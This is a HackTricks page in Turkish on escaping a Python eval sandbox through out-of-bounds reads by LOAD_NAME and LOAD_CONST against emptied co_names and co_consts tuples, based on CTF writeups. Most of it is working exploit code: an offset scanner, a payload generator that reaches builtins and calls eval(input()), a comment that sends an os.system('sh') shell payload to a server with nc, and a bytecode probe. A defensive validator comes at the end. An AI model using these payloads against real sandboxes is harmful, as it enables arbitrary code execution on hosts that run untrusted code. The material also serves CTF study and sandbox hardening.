# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, Splitline'ın HITCON CTF 2022 "V O I D" için hazırladığı özgün writeup'ı ve exploit chain'i temel alır.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Bir `LOAD_NAME` veya `LOAD_CONST` operand'ı, kasıtlı olarak kısaltılmış bir `co_names` ya da `co_consts` tuple'ının dışını okuyabilir. Bu challenge'da, yakındaki bir entry `__getattribute__` gibi kullanışlı bir attribute içerene kadar erişilemeyen dummy name'ler kullanılır.<sup>[[1]](#references)</sup>

Payload'ın geri kalanı, sandbox escape oluşturmak için elde edilen bu name'i yeniden kullanır.<sup>[[1]](#references)</sup>

### Genel Bakış <a href="#overview-1" id="overview-1"></a>

Challenge wrapper kısadır ve değerlendirmeden önce tek bir expression derler:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Girdi bir Python code object olarak derlenir, ardından wrapper, `eval` çağrılmadan önce `co_consts` ve `co_names` değerlerini boş tuple'larla değiştirir.<sup>[[1]](#references)[[5]](#references)</sup>

Bu tablolardan birini hâlâ indeksleyen herhangi bir oluşturulmuş instruction, build'e bağlı olarak interpreter'ın çökmesine veya bitişik bir object pointer'ın açığa çıkmasına neden olabilir.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault nasıl gerçekleşir?

`[a, b, c]` gibi bir list expression için compiler, ardışık operand'lara sahip `LOAD_NAME` instruction'ları üretir:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
`co_names`, `()`` ile değiştirilirse bytecode hâlâ `LOAD_NAME 2` içerir; bu nedenle denetlenmeyen tuple erişimi `IndexError` oluşturmak yerine tuple dışındaki bir pointer'ı alabilir.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` ve `LOAD_CONST` buradaki temel primitive'lerdir: integer operand'ları sırasıyla `co_names` ve `co_consts` içindeki girdileri seçer.<sup>[[1]](#references)[[2]](#references)</sup>

CPython'ın dispatch mekanizmasında `LOAD_CONST`, seçilen tuple girdisini alıp stack'e push eder; release build'ler denetlenmeyen bir tuple accessor kullanır:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Hedef interpreter üzerinde artan `LOAD_NAME` operandlarını deneyerek kullanışlı girdileri eşleyin. Splitline, challenge ortamında 700'ün üzerindeki kullanışlı offset'ler gözlemledi; ancak yerleşim build'e özeldir; bir debugger çevredeki belleği incelemeye yardımcı olabilir.<sup>[[1]](#references)</sup>

### Exploit'i Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Bir offset kullanışlı bir ad verdiğinde, aralık dışı lookup işlemini erişilemeyen bir ifadeye yerleştirin ve aynı `co_names` slot'una erişilebilir bir attribute erişiminden başvurun.<sup>[[1]](#references)</sup>

Örneğin, offset 5 `__getattribute__` veriyorsa, false branch kullanışlı lookup işlemini gerçekleştirirken bu adı slot 5'te tutun:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Kurtarılan metnin `__getattribute__` olması gerekmez; payload'a hizmet eden herhangi bir identifier bu slot'u doldurabilir.<sup>[[1]](#references)</sup>

Compiler, tek bir name'in tekrarlanan kullanımları için `co_names` slot'unu yeniden kullanır; disassembly bunu gösterir:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Çünkü `LOAD_ATTR` adını da `co_names` üzerinden çözdüğü için, erişilebilir branch bu slotu yeniden kullanabilir; daha yeni CPython sürümlerindeki packed operand'lar aşağıdaki sürüm notlarında açıklanmıştır.<sup>[[1]](#references)[[2]](#references)</sup>

Küçük, negatif olmayan tam sayılar sabitler olmadan boolean ifadeler kullanılarak sentezlenebilir:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Scripti <a href="#exploit-script-1" id="exploit-script-1"></a>

Orijinal exploit, challenge'ın uzunluk sınırı içinde kalmak için sabitler yerine name'ler kullandı.<sup>[[1]](#references)</sup>

Bu yardımcı, boş bir `co_names` tuple'ı ile bir code object oluşturarak aday name offset'lerini tarar.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Aşağıdaki generator, kurtarılan ofsetleri adlarla eşleştirir ve source-level payload üretir.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Genel hatlarıyla, oluşturulan payload bir function'ın global değerlerini elde eder, `builtins` öğesini geri kazanır ve `eval(input())` çağrısını yapar.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Sürüm notları ve etkilenen opcod’lar (Python 3.11–3.13)

- CPython 3.11–3.13’te talimatlar, code object’in constant ve name tablolarını indekslemek için hâlâ integer operand’lar kullanır. Tuple’lardan biri referans verilen indeksten daha kısaysa, unchecked access bitişik bir object pointer’ını okuyabilir ve crash’e veya bu pointer üzerinde işlem yapılmasına neden olabilir; kesin davranış interpreter build’ine bağlıdır.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` ve (3.12+) `RETURN_CONST consti`, `co_consts[consti]` değerini okur.<sup>[[2]](#references)</sup>
- Doğrudan name-table kullananlar arasında `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` ve (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` bulunur.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` ve `LOAD_ATTR namei`, `co_names[namei >> 1]` kullanır; low bit, belgelenen NULL/method davranışını kontrol eder. (3.12+) `LOAD_SUPER_ATTR namei`, `co_names[namei >> 2]` kullanır ve low bit’lerine iki flag yerleştirir.<sup>[[2]](#references)</sup>
- Python 3.11+, talimatlar arasına gizli `CACHE` entry’leri ekleyen adaptive/inline cache’leri kullanıma sundu. Handcrafted bytecode, `co_code` oluşturulurken bu entry’leri hesaba katmalıdır.<sup>[[2]](#references)</sup>

Pratik sonuç: bytecode yerleşimi ve kurtarılan offset’ler release ve build’e özeldir. Tekniğe güvenmeden önce tekniği ve oluşturulan payload’ı hedef CPython sürümüne karşı test edin.<sup>[[2]](#references)</sup>

### Kullanışlı OOB index’leri bulmak için hızlı scanner (3.11+/3.12+ uyumlu)

İlginç object’leri high-level source’tan değil, doğrudan bytecode üzerinden araştırmayı tercih ediyorsanız minimal code object’leri oluşturabilir ve index’leri brute-force tarayabilirsiniz. Aşağıdaki helper, target interpreter’ın `dis` metadata’sına göre inline cache’leri ekler.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notlar
- Bunun yerine isimleri probe etmek için `LOAD_CONST` öğesini `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` ile değiştirin ve hedef opcode için stack kullanımını ve packed operand'ı ayarlayın.<sup>[[2]](#references)</sup>
- Gerekirse >255 indekslerine ulaşmak için `EXTENDED_ARG` veya birden fazla `arg` byte'ı kullanın. Bu helper yalnızca düşük operand byte'ını üretir; bu nedenle daha büyük indeksler için ham byte oluşturma veya birden fazla load gerekir.<sup>[[2]](#references)</sup>

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

`co_consts` içinde builtins module'üne çözümlenen bir indeks belirledikten sonra, `co_names` kullanmadan stack'i manipüle ederek `eval(input())` ifadesini yeniden oluşturabilirsiniz. Official B01lers CTF 2024 `awpcode` materyali, aynı OOB-read pattern'ini belgelemektedir.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Bu yalnızca-stack yaklaşımı, bir challenge size doğrudan `co_code` üzerinde kontrol verirken `co_consts=()` ve `co_names=()` kullanmaya zorladığında faydalıdır; source-level hilelerden kaçınır ve bytecode stack işlemleri ile tuple builder'ları kullanarak payload'ları küçük tutabilir.<sup>[[4]](#references)</sup>

### Sandboxes için savunma kontrolleri ve mitigations

Güvenilmeyen kodu derleyen veya değerlendiren bir Python sandbox yazıyorsanız, bytecode tarafından kullanılan tuple index'lerinin bounds-check işlemini CPython'a bırakmayın. Çalıştırmadan önce code object'lerini doğrulayın.<sup>[[2]](#references)[[3]](#references)</sup>

Pratik validator (`co_consts/co_names` için OOB erişimini reddeder).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ek azaltım fikirleri
- Güvenilmeyen girdiler üzerinde rastgele `CodeType.replace(...)` kullanımına izin vermeyin veya ortaya çıkan code object üzerinde katı yapısal kontroller uygulayın.
- Güvenilmeyen code'u CPython semantics'e güvenmek yerine OS-level sandboxing (seccomp, job objects, containers) ile ayrı bir process'te çalıştırmayı değerlendirin.

## References

- [1] [Splitline'ın HITCON CTF 2022 writeup'ı "V O I D" (bu technique'in ve high-level exploit chain'in kaynağı)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands ve inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
